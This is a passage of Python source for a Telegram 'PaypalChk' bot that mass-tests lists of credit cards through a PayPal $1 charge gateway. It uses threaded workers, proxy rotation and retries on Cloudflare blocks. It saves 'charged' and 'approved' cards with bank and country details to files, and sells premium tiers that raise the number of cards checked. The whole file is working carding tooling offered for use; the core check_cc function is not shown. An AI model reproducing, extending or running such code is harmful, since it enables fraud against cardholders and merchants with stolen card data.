        bot.reply_to(message, f"[!] 𝙁𝙤𝙪𝙣𝙙 {total_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)\n{limit} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙")
        ccs = ccs[:limit]
    
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    total = len(ccs)
    if is_admin(user_id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
    elif is_premium(user_id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
    else: is_p = " [𝗙𝗥𝗘𝗘]"
    initial_text = f"𝗣𝗮𝘆𝗽𝗮𝗹𝗖𝗵𝗸 𝗝𝗼𝗯: {job_id} / 𝗣𝗮𝘆𝗽𝗮𝗹 — 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n\n[□□□□□□□□□□] (0.0%)\n\n𝗧𝗮𝘀𝗸       - 𝗣𝗮𝘆𝗽𝗮𝗹 𝟭$\n𝗧𝗼𝘁𝗮𝗹      - {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  - 0/{total}\n𝗖𝗵𝗮𝗿𝗴𝗲𝗱    - 0\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   - 0\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   - 0\n𝗘𝗿𝗿𝗼𝗿𝘀     - 0\n𝗧/𝗧        - 0𝘀\n𝗨𝘀𝗲𝗿       - {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝘂𝗻𝗻𝗶𝗻𝗴.\n\n𝗗𝗲𝘃 - @Xoarch"
    prog_msg = bot.reply_to(message, initial_text)
    
    results = {"charged": 0, "approved": 0, "declined": 0, "error": 0, "checked": 0}
    start_time = time.time()
    
    def worker(cc):
        if not ACTIVE_JOBS.get(job_id): return
        
        status, response = "ERROR", "N/A"
        for _ in range(3):
            proxy_dict = None
            p_raw = None
            if USE_PROXY:
                proxy_dict, p_raw = get_proxy_dict()
                
            try:
                status, response = check_cc(cc, proxy_dict)
            finally:
                time.sleep(1.5)
                if USE_PROXY: release_proxy(p_raw)
                
            if status != "ERROR" and response not in ["Proxy/Connection Fail", "Read Timeout", "Cloudflare Block"]:
                break
                
            print(f"[!] Retry triggered on {cc} | Status: {status} | Error: {response}")
            time.sleep(2)
            
        response = fmt(response)
            
        if status == "CHARGED": results["charged"] += 1
        elif status == "APPROVED": results["approved"] += 1
        elif status == "DECLINED": results["declined"] += 1
        else: results["error"] += 1
        results["checked"] += 1
        
        if status in ["CHARGED", "APPROVED"]:
            os.makedirs('Data', exist_ok=True)
            if status == "CHARGED":
                try: s = get_stats(); s["charged"] += 1; save_stats(s)
                except: pass
                save_unique_cc('Data/charged.txt', cc, response)
            elif status == "APPROVED":
                try: s = get_stats(); s["approved"] += 1; save_stats(s)
                except: pass
                save_unique_cc('Data/approved.txt', cc, response)

            bin_code = cc[:6]
            brand, bank, country, level, type_cc = get_bin_info(bin_code)
            if is_admin(user_id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
            elif is_premium(user_id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
            else: is_p = " [𝗙𝗥𝗘𝗘]"
            status_f = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if status == "CHARGED" else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "APPROVED" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
            
            safe_fname = str(message.from_user.first_name).replace("<", "").replace(">", "").replace("&", "")
            safe_bank = str(bank).replace("<", "").replace(">", "").replace("&", "")
            safe_brand = str(brand).replace("<", "").replace(">", "").replace("&", "")
            
            res_single = f"""
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_f}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ <code>{response}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝐏𝐚𝐲𝐩𝐚𝐥 𝟏$
━━━━━━━━━━━
𝐈𝐧𝐟𝐨 ➜ {safe_brand} - {type_cc} - {level}
𝐁𝐚𝐧𝐤 ➜ {safe_bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country}
━━━━━━━━━━━
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ {safe_fname}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
            try: bot.reply_to(message.reply_to_message, res_single, parse_mode="HTML")
            except Exception as e:
                print("[!] HTML Parse Error while hitting: ", e)
                try: bot.send_message(message.chat.id, res_single.replace("<code>", "").replace("</code>", ""))
                except: pass

        if results["checked"] % 10 == 0 or results["checked"] == total:
            p = (results["checked"] / total) * 100
            filled = int(p // 10)
            bar = "■" * filled + "□" * (10 - filled)
            tt = round(time.time() - start_time, 1)
            if is_admin(user_id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
            elif is_premium(user_id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
            else: is_p = " [𝗙𝗥𝗘𝗘]"
            update_text = f"𝗣𝗮𝘆𝗽𝗮𝗹𝗖𝗵𝗸 𝗝𝗼𝗯: {job_id} / 𝗣𝗮𝘆𝗽𝗮𝗹 — 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n\n[{bar}] ({round(p, 1)}%)\n\n𝗧𝗮𝘀𝗸       - 𝗣𝗮𝘆𝗽𝗮𝗹 𝟭$\n𝗧𝗼𝘁𝗮𝗹      - {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  - {results['checked']}/{total}\n𝗖𝗵𝗮𝗿𝗴𝗲𝗱    - {results['charged']}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   - {results['approved']}\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   - {results['declined']}\n𝗘𝗿𝗿𝗼𝗿𝘀     - {results['error']}\n𝗧/𝗧        - {tt}𝘀\n𝗨𝘀𝗲𝗿       - {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝘂𝗻𝗻𝗶𝗻𝗴.\n\n𝗗𝗲𝘃 - @Xoarch"
            try: bot.edit_message_text(update_text, message.chat.id, prog_msg.message_id)
            except: pass

    with ThreadPoolExecutor(max_workers=12) as executor:
        for cc in ccs:
            if not ACTIVE_JOBS.get(job_id): break
            executor.submit(worker, cc)

    if not ACTIVE_JOBS.get(job_id):
        final_text = prog_msg.text.replace("𝗥𝘂𝗻𝗻𝗶𝗻𝗴", "𝗦𝘁𝗼𝗽𝗽𝗲𝗱").replace("𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝘂𝗻𝗻𝗶𝗻𝗴.", "𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗦𝘁𝗼𝗽𝗽𝗲𝗱.")
        try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
        except: pass
        del ACTIVE_JOBS[job_id]
        if USER_ACTIVE_JOB.get(user_id) == job_id:
            ACTIVE_USERS_MPP[user_id] = False
            USER_ACTIVE_JOB.pop(user_id, None)
        return

    tt = round(time.time() - start_time, 1)
    if is_admin(user_id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
    elif is_premium(user_id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
    else: is_p = " [𝗙𝗥𝗘𝗘]"
    
    final_text = f"𝗣𝗮𝘆𝗽𝗮𝗹𝗖𝗵𝗸 𝗝𝗼𝗯: {job_id} / 𝗣𝗮𝘆𝗽𝗮𝗹 — 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱\n\n[■■■■■■■■■■] (100.0%)\n\n𝗧𝗮𝘀𝗸       - 𝗣𝗮𝘆𝗽𝗮𝗹 𝟭$\n𝗧𝗼𝘁𝗮𝗹      - {total}\n𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱  - {results['checked']}/{total}\n𝗖𝗵𝗮𝗿𝗴𝗲𝗱    - {results['charged']}\n𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱   - {results['approved']}\n𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱   - {results['declined']}\n𝗘𝗿𝗿𝗼𝗿𝘀     - {results['error']}\n𝗧/𝗧        - {tt}𝘀\n𝗨𝘀𝗲𝗿       - {message.from_user.first_name}{is_p}\n\n𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱.\n\n𝗗𝗲𝘃 - @Xoarch"
    try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
    except: pass
    del ACTIVE_JOBS[job_id]
    if USER_ACTIVE_JOB.get(user_id) == job_id:
        ACTIVE_USERS_MPP[user_id] = False
        USER_ACTIVE_JOB.pop(user_id, None)

@bot.message_handler(commands=['stop'])
def stop_job(message):
    user_id = message.from_user.id
    if not is_premium(user_id) and not is_admin(user_id):
        bot.reply_to(message, "[✗] 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗢𝗻𝗹𝘆! 𝗨𝗽𝗴𝗿𝗮𝗱𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝘁𝗼 𝘂𝘀𝗲 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 𝗮𝗻𝗱 /𝘀𝘁𝗼𝗽.")
        return
    parts = message.text.split()

    if len(parts) > 1:
        jid = parts[1].upper()
    else:
        jid = USER_ACTIVE_JOB.get(user_id)
        if not jid:
            bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗮𝗰𝘁𝗶𝘃𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘀𝘁𝗼𝗽.")
            return

    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        if USER_ACTIVE_JOB.get(user_id) == jid:
            USER_ACTIVE_JOB.pop(user_id, None)
            ACTIVE_USERS_MPP[user_id] = False
        bot.reply_to(message, f"[✓] 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 {jid} 𝘀𝘁𝗼𝗽𝗽𝗲𝗱. 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘀𝘁𝗮𝗿𝘁 𝗮 𝗻𝗲𝘄 𝗼𝗻𝗲.")
    else:
        bot.reply_to(message, f"[✓] 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 {jid} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗼𝗿 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!")

@bot.message_handler(commands=['addpremium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        
        if is_premium(target_id):
            bot.reply_to(message, f"[✗] 𝗨𝘀𝗲𝗿 {target_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘀 𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗲 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻!")
            return
            
        duration = parts[2]
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        
        with open(PREMIUM_FILE, 'a') as f: f.write(f"{target_id}|{exp}\n")
        
        if is_admin(message.from_user.id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
        elif is_premium(message.from_user.id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
        else: is_p = " [𝗙𝗥𝗘𝗘]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Premium Added
✗ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ↬ {duration.upper()}
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), f"[!] 𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗼𝗿 {duration.upper()}! 𝗘𝗻𝗷𝗼𝘆 𝘂𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗰𝗵𝗲𝗰𝗸𝘀.")
        except: pass
    except: bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /addpremium <userid> <days>(1s,1m,1h,1d,lifetime)")

@bot.message_handler(commands=['rmpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        target_id = message.text.split()[1]
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        
        if is_admin(message.from_user.id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
        elif is_premium(message.from_user.id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
        else: is_p = " [𝗙𝗥𝗘𝗘]"
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗 ↬ {target_id}
✗ 𝗔𝗰𝘁𝗶𝗼𝗻 ↬ Premium Removed
✗ 𝗥𝗲𝗮𝘀𝗼𝗻 ↬ Admin Action
✗ 𝗡𝗲𝘄 𝗥𝗮𝗻𝗸 ↬ [𝗙𝗥𝗘𝗘]
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), "[!] 𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗯𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        except: pass
    except: bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /rmpremium <userid>")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        duration = parts[2] if len(parts) > 2 else 'lifetime'
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        
        with open(BANNED_FILE, 'a') as f: f.write(f"{target_id}|{exp}\n")
        dur_label = "Lifetime" if duration == 'lifetime' else duration.upper()
        bot.reply_to(message, f"[✓] 𝗨𝘀𝗲𝗿 {target_id} 𝗕𝗮𝗻𝗻𝗲𝗱 ({dur_label}) 𝗯𝘆 𝗔𝗱𝗺𝗶𝗻!")
        try: bot.send_message(int(target_id), f"[!] 𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗕𝗔𝗡𝗡𝗘𝗗 𝗯𝘆 𝗮𝗻 𝗔𝗱𝗺𝗶𝗻.\n\n𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {dur_label}\n𝗦𝘁𝗮𝘁𝘂𝘀: Restricted access\n\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻.")
        except: pass
    except: bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /ban <userid> <duration>")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    try:
        target_id = message.text.split()[1]
        with open(BANNED_FILE, 'r') as f: lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        bot.reply_to(message, f"[✓] 𝗨𝘀𝗲𝗿 {target_id} 𝘂𝗻𝗯𝗮𝗻𝗻𝗲𝗱 𝗯𝘆 𝗔𝗱𝗺𝗶𝗻!")
        try: bot.send_message(int(target_id), f"[!] 𝗡𝗼𝘁𝗶𝗰𝗲: 𝗬𝗼𝘂𝗿 𝗕𝗔𝗡 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 𝗯𝘆 𝗮𝗻 𝗔𝗱𝗺𝗶𝗻.\n\n𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗮𝗴𝗮𝗶𝗻. 𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘁𝗼 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆 𝗿𝘂𝗹𝗲𝘀!")
        except: pass
    except: bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /unban <userid>")

@bot.message_handler(commands=['info'])
def user_info(message):
    try:
        parts = message.text.split()
        target_id = parts[1] if len(parts) > 1 else message.from_user.id
        target_id = str(target_id)
        
        role = "[𝗙𝗥𝗘𝗘]"
        limit = FREE_LIMIT
        expire_str = "NEVER"
        
        if is_banned(int(target_id)):
            role = "[𝗕𝗔𝗡𝗡𝗘𝗗]"
            limit = 0
            expire_str = "Restricted"
        elif is_admin(int(target_id)):
            role = "[𝗔𝗗𝗠𝗜𝗡]"
            limit = PREMIUM_LIMIT
            expire_str = "Lifetime"
        else:
            with open(PREMIUM_FILE, 'r') as f:
                premiums = f.read().splitlines()
                for p in premiums:
                    if target_id in p:
                        role = "[𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
                        limit = PREMIUM_LIMIT
                        prts = p.split('|')
                        if len(prts) > 1:
                            exp = float(prts[1])
                            if exp == 0: expire_str = "Lifetime"
                            else:
                                if time.time() > exp:
                                    role = "[𝗙𝗥𝗘𝗘]"
                                    limit = FREE_LIMIT
                                    expire_str = "Expired"
                                else:
                                    expire_str = datetime.datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')
                        else: expire_str = "Lifetime"
                        break

        if is_admin(message.from_user.id): is_p = " [𝗔𝗗𝗠𝗜𝗡]"
        elif is_premium(message.from_user.id): is_p = " [𝗣𝗥𝗘𝗠𝗜𝗨𝗠]"
        else: is_p = " [𝗙𝗥𝗘𝗘]"
        
        res = f"""
𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
━━━━━━━━━━━━━
✗ 𝗨𝘀𝗲𝗿 𝗜𝗗 ↬ {target_id}
✗ 𝗥𝗮𝗻𝗸 ↬ {role}
✗ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ↬ {expire_str}
✗ 𝗠𝗮𝘀𝘀 𝗟𝗶𝗺𝗶𝘁 ↬ {limit}
━━━━━━━━━━━━━
⌬ 𝐔𝐬𝐞𝐫 ↬ {message.from_user.first_name}{is_p}
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
        bot.reply_to(message, res)
    except:
        bot.reply_to(message, "[✗] 𝗘𝗿𝗿𝗼𝗿 𝗳𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗶𝗻𝗳𝗼!")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    s = get_stats()
    
    with open(BANNED_FILE, 'r') as f: banned_count = len(f.read().splitlines())
    with open(PREMIUM_FILE, 'r') as f: premium_count = len(f.read().splitlines())
    
    s["premium_users"] = premium_count
    s["banned_users"] = banned_count
    save_stats(s)
    
    res = f"""
𝗕𝗼𝘁 𝗦𝘁𝗮𝘁𝘀:
━━━━━━━━━━━━━
✗ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: {s['charged']}
✗ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {s['approved']}
✗ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗨𝘀𝗲𝗿𝘀: {premium_count}
✗ 𝗕𝗮𝗻𝗻𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {banned_count}
✗ 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {s['total_users']}
━━━━━━━━━━━━━
⌬ 𝐃𝐞𝐯 ↬ @Xoarch
"""
    bot.reply_to(message, res)

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[✗] 𝗬𝗼𝘂 𝗱𝗼𝗻𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!!")
        return
    
    msg_text = message.text.replace('/broadcast ', '')
    if msg_text == '/broadcast':
        bot.reply_to(message, "[✗] 𝗨𝘀𝗮𝗴𝗲: /broadcast <message>")
        return
    
    with open(USERS_FILE, 'r') as f:
        users = f.read().splitlines()
    
    sent_msg = bot.reply_to(message, f"[✓] 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘁𝗼 {len(users)} 𝘂𝘀𝗲𝗿𝘀...")
    
    count = 0
    for user in users:
        try:
            bot.send_message(int(user), msg_text)
            count += 1
        except:
            pass
    
    try:
        bot.edit_message_text(f"[✓] 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!\n\n𝗦𝗲𝗻𝘁 𝘁𝗼: {count}/{len(users)} 𝘂𝘀𝗲𝗿𝘀.", message.chat.id, sent_msg.message_id)
    except:
        bot.reply_to(message, f"[✓] 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!\n\n𝗦𝗲𝗻𝘁 𝘁𝗼: {count}/{len(users)} 𝘂𝘀𝗲𝗿𝘀.")



if __name__ == "__main__":
    print("𝗕𝗢𝗧 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling Error: {e}")
            time.sleep(5)


